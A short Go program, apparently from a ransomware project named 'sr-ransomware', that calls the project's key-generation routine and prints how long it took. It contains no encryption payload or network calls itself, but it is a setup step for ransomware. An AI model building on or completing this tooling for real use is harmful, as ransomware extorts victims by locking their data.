package main

import (
    "fmt"
    "time"

    "github.com/sug0/sr-ransomware/go/crypto/scheme"
)

func main() {
    t := time.Now()
    err := scheme.GenerateKeys()
    if err != nil {
        panic(err)
    }
    fmt.Printf("Keys generated in %s.\n", time.Since(t))
}
